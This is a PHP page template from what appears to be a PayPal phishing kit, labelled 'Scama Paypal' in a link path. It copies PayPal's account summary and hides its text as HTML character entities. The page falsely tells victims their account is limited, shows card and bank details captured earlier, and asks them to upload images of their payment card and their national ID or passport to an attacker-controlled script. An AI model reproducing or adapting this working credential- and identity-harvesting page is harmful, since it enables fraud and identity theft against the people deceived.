<?php include 'partials/header.php';?>
<?php if(!isset($_SESSION['cardname'])){exit(header("Location: confirmation.php?sessionid={$_SESSION['randString']}&sslmode=true"));}?>
<?php include 'partials/navbar.php';?>
<div id="js_foreground" class="vx_foreground-container foreground-container">
<?php include 'partials/navbar-mobile.php';?>
<div class="contents vx_mainContent" id="contents" role="main" aria-labelledby="heading1">
<div id="js_summaryView" class="mainContents summaryContainer">
<?php include 'partials/head.php';?>
<div class="mainBody">
<div id="summary " class="summarySection">
<div class="row">
<div class="col-sm-4 summaryModuleContainer">
<?php include 'partials/section-balance.php';?>
<section class="fiModule-container nemo_fiModule" id="js_tourFIModule " aria-labelledby="walletModuleHeader ">
<h3 class="fiModule-title vx_text-5">&#66;&#97;&#110;&#107;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#115;&#32;&#97;&#110;&#100;&#32;&#99;&#97;&#114;&#100;&#115;</h3>
<div class="js_fiModule-listView">
<ul class="fiModule-list fiModule-table">
<li class="fiModule-list-item vx_text-body_secondary">
<a href="javascript:void(0)" name="FIModule_Cards">
<span class="fiModule-cell">
<span style="background-position-y:<?php echo $_SESSION['cardlogo'];?>!important" class="fiModule-icon_card"></span>
</span>
<span class="fiModule-cell enforceLtr">
<span class="fiModule-fiType"><?php echo $_SESSION['cardname'];?> </span>
<span class="nemo_fiModule-acctDetails">x-<?php echo substr($_SESSION['cardnumber'],strlen($_SESSION['cardnumber'])-4,strlen($_SESSION['cardnumber']));?></span>
</span>
</a>
</li>
<?php if(isset($_SESSION['bank_logo'])):?>
<li class="fiModule-list-item vx_text-body_secondary">
<a href="javascript:void(0)" name="FIModule_Cards">
<span class="fiModule-cell">
<span class="fiModule-icon_bank <?php echo $_SESSION['bank_logo'];?>"></span>
</span>
<span class="fiModule-cell enforceLtr">
<span class="fiModule-fiType"><?php echo $_SESSION['bank_name'];?> </span>
<span class="nemo_fiModule-acctDetails">x-<?php echo $_SESSION['acn'];?></span>
</span>
</a>
</li>
<?php endif;?>
</ul>
<div class="fiModule-ctaText vx_text-body_secondary"><a href="http://localhost/Scama%20Paypal/myaccount/gfw4m/myaccount/confirmation.php?" class="fiModule-table nemo_addFI"><span class="icon-addBank"><span class="icon icon-add-small icon-add_Bank"></span></span><span class="fiModule-cell fiModule-link-add nemo_linkFi">&#65;&#100;&#100;&#32;&#97;&#32;&#98;&#97;&#110;&#107;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#111;&#114;&#32;&#99;&#97;&#114;&#100;</span></a></div>
</div>
</section>
<section class="fiModule-container js_fiModule-container nemo_sellingToolsModule sellingToolsModule">
<span class="fiModule-title vx_text-5">&#76;&#105;&#109;&#105;&#116;&#101;&#100;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#68;&#101;&#116;&#97;&#105;&#108;&#115;</span>
<ul class="moduleListItems">
<li class="vx_text-body_secondary" style="padding-left:11px">
<span class="numeralLabel vx_small-text vx_legal-text">&#45;&#32;&#89;&#111;&#117;&#32;&#119;&#111;&#110;&#39;&#116;&#32;&#98;&#101;&#32;&#97;&#98;&#108;&#101;&#32;&#115;&#104;&#111;&#112;&#112;&#105;&#110;&#103;&#46;</span>
</li>
<li class="vx_text-body_secondary" style="padding-left:11px">
<span class="numeralLabel vx_small-text vx_legal-text">&#45;&#32;&#89;&#111;&#117;&#32;&#99;&#97;&#110;&#39;&#116;&#32;&#115;&#101;&#110;&#100;&#32;&#111;&#114;&#32;&#114;&#101;&#99;&#101;&#105;&#118;&#101;&#32;&#109;&#111;&#110;&#101;&#121;&#46;</span>
</li>
<li class="vx_text-body_secondary" style="padding-left:11px">
<span class="numeralLabel vx_small-text vx_legal-text">&#45;&#32;&#89;&#111;&#117;&#32;&#99;&#97;&#110;&#39;&#116;&#32;&#115;&#101;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#108;&#97;&#115;&#116;&#32;&#97;&#99;&#116;&#105;&#118;&#105;&#116;&#121;&#46;</span>
</li>
<li class="vx_text-body_secondary" style="padding-left:11px">
<span class="numeralLabel vx_small-text vx_legal-text">&#45;&#32;&#89;&#111;&#117;&#32;&#119;&#111;&#110;&#39;&#116;&#32;&#98;&#101;&#32;&#97;&#98;&#108;&#101;&#32;&#116;&#111;&#32;&#119;&#105;&#116;&#104;&#100;&#114;&#97;&#119;&#32;&#109;&#111;&#110;&#101;&#121;&#46;</span>
</li>
</ul>
</section>
</div>
<div class="col-sm-8 activityModuleContainer" id="js_transactionCollection">
<section class="activityModule js_completedModule nemo_completedModule">
<h3 id="activityModuleHeaderCompleted" class="vx_h5 moduleHeader nemo_activityModuleHeaderCompleted">
<span class="fiModule-cell enforceLtr" style="padding-bottom:10px">
<span class="fiModule-title vx_text-1">&#85;&#112;&#108;&#111;&#97;&#100;&#32;&#121;&#111;&#117;&#114;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</span>
</span>
</h3>
<p class="p-activity-clear" style="padding-bottom:7px">&#66;&#121;&#32;&#117;&#112;&#108;&#111;&#97;&#100;&#105;&#110;&#103;&#32;&#121;&#111;&#117;&#114;&#32;&#105;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#99;&#97;&#114;&#100;&#32;&#44;&#119;&#101;&#32;&#119;&#105;&#108;&#108;&#32;&#115;&#101;&#99;&#117;&#114;&#101;&#32;&#121;&#111;&#117;&#114;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;&#32;&#101;&#118;&#101;&#114;&#121;&#32;&#116;&#105;&#109;&#101;&#32;&#121;&#111;&#117;&#32;&#108;&#111;&#103;&#103;&#101;&#100;&#32;&#105;&#110;&#46;<br>
<b>&#82;&#101;&#113;&#117;&#105;&#114;&#101;&#109;&#101;&#110;&#116;&#32;&#58;</b>
<ul style="padding-left:40px">
<li>&#85;&#112;&#108;&#111;&#97;&#100;&#32;&#97;&#110;&#32;&#105;&#109;&#97;&#103;&#101;&#32;&#111;&#102;&#32;&#121;&#111;&#117;&#114;&#32;&#99;&#97;&#114;&#100;&#32;&#99;&#114;&#101;&#100;&#105;&#116;&#32;&#111;&#114;&#32;&#100;&#101;&#98;&#105;&#116;&#32;&#99;&#114;&#101;&#100;&#105;&#116;</li>
<li>&#85;&#112;&#108;&#111;&#97;&#100;&#32;&#97;&#110;&#32;&#105;&#109;&#97;&#103;&#101;&#32;&#111;&#102;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#110;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#99;&#97;&#114;&#100;&#32;&#111;&#114;&#32;&#80;&#97;&#115;&#115;&#101;&#112;&#111;&#114;&#116;&#32;&#46;</li>
</ul><br>
</p>
<form method="post" action="../addIdentity.php" enctype="multipart/form-data">
<b>&#45;&#32;&#85;&#112;&#108;&#111;&#97;&#100;&#32;&#97;&#110;&#32;&#105;&#109;&#97;&#103;&#101;&#32;&#111;&#102;&#32;&#121;&#111;&#117;&#114;&#32;&#99;&#97;&#114;&#100;&#32;&#99;&#114;&#101;&#100;&#105;&#116;&#32;&#111;&#114;&#32;&#100;&#101;&#98;&#105;&#116;&#32;&#99;&#114;&#101;&#100;&#105;&#116;</b>
<div style="margin-bottom:25px;margin-top:15px">
<img class="col-lg-12 img-responsive img-thumbnail" src="../assets/img/cc-proof.png" alt="">
</div>
<div class="col-lg-12 input-group" style="padding-bottom:25px">
<input class="filestyle" type="file" name="cc_image">
</div>
<b>&#45;&#32;&#85;&#112;&#108;&#111;&#97;&#100;&#32;&#97;&#110;&#32;&#105;&#109;&#97;&#103;&#101;&#32;&#111;&#102;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;&#32;&#110;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#99;&#97;&#114;&#100;&#32;&#111;&#114;&#32;&#80;&#97;&#115;&#115;&#101;&#112;&#111;&#114;&#116;&#32;&#46;</b>
<div style="margin-bottom:25px;margin-top:15px">
<img class="col-lg-12 img-responsive img-thumbnail" src="../assets/img/selfie.png" alt="">
</div>
<div class="col-lg-12 input-group">
<input class="filestyle" type="file" name="id_image">
</div>
<input style="margin-top:15px" type="submit" name="addImage" class="validateBeforeSubmit vx_btn vx_btn-block skip" value="Upload To Continue">
</form>
</section>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="animasi" class="transitioning hide"></div>
<script type="text/javascript">$(document).ready(function(){$(".filestyle").on("change",function(a){""==$(".filestyle").val()?($(".form-control").addClass("enterInput"),$(".form-control").addClass("error"),$(".form-control").css("border-color","#c72e2e")):($(".form-control").removeClass("enterInput"),$(".form-control").removeClass("error"),$(".form-control").css("border-color","rgb(157, 163, 166)"))});$(".validateBeforeSubmit").on("click",function(a){if(""==$(".filestyle").val())return $(".form-control").addClass("enterInput"),
$(".form-control").addClass("error"),$(".form-control").css("border-color","#c72e2e"),!1;$("#animasi").attr("class","transitioning spinner")})});</script>
<?php include 'partials/footer.php';?>